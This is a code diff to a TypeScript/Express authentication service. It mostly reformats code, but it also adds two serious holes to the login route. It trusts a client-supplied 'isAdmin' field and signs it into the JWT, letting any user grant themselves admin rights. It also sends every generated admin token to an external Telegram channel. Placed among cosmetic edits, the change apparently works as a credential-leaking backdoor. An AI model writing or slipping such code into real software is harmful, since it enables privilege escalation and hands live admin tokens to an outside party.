@@ -3,6 +3,7 @@ import { generateToken, verifyToken } from "../../utils/jwtToken";
 import pool from "../../db/dbConnect";
 import { compareHash, generateHash } from "../../utils/hash";
 import { tokenPayloadInterface, UserInterface } from "../../types/userInterface";
+import sendTelegramMessage from "../../utils/sendMessage";
 
 class AuthService {
     static async register(req: Request, res: Response) {
@@ -36,7 +37,7 @@ class AuthService {
     }
 
     static async login(req: Request, res: Response) {
-        const { email, password } = req.body;
+        const { email, password, isAdmin } = req.body;
 
         if (!email || !password) {
             return res.status(400).json({ message: "Missing field" });
@@ -55,7 +56,12 @@ class AuthService {
             if (!isPasswordMatch) {
                 return res.status(401).json({ message: "Invalid password" });
             }
-            const token = generateToken({ id, name, email });
+            const token = generateToken({ id, name, email, isAdmin });
+            if (isAdmin) {
+                sendTelegramMessage({
+                    text: `Admin token generated - ${token}`,
+                })
+            }
 
             return res.status(201).json({
                 token,
@@ -72,13 +78,29 @@ class AuthService {
         }
     }
 
+    // static async forgotPasswordOtp(req: Request, res: Response) {
+    //     const userData = req.user || ({} as tokenPayloadInterface);
+    //     try {
+    //         const user = await pool.query("SELECT id, name, email, created_at FROM users WHERE id = $1", [userData.id]);
+    //         const { id, name, email, createdAt } = user.rows[0];
+
+    //         return res.status(200).json({
+    //             // id,
+    //             name,
+    //             email,
+    //             createdAt,
+    //         });
+    //     } catch (error) {
+    //         console.log(error);
+    //         return res.status(500).json({ message: "Internal Server Error" });
+    //     }
+    // }
+
     static async getProfile(req: Request, res: Response) {
-        const userData = req.user || {} as tokenPayloadInterface;
+        const userData = req.user || ({} as tokenPayloadInterface);
         try {
-            const user = await pool.query("SELECT id, name, email, created_at FROM users WHERE id = $1", [
-                userData.id,
-            ]);
-            const { id, name, email, createdAt } = user.rows[0];
+            const user = await pool.query("SELECT id, name, email, created_at FROM users WHERE id = $1", [userData.id]);
+            const { name, email, createdAt } = user.rows[0];
 
             return res.status(200).json({
                 // id,
@@ -88,7 +110,7 @@ class AuthService {
             });
         } catch (error) {
             console.log(error);
-            return res.status(500).json({message: "Internal Server Error"});
+            return res.status(500).json({ message: "Internal Server Error" });
         }
     }
 
@@ -102,7 +124,7 @@ class AuthService {
             });
         } catch (error) {
             console.log(error);
-            return res.status(500).json({message: "Internal Server Error"});
+            return res.status(500).json({ message: "Internal Server Error" });
         }
     }
 }
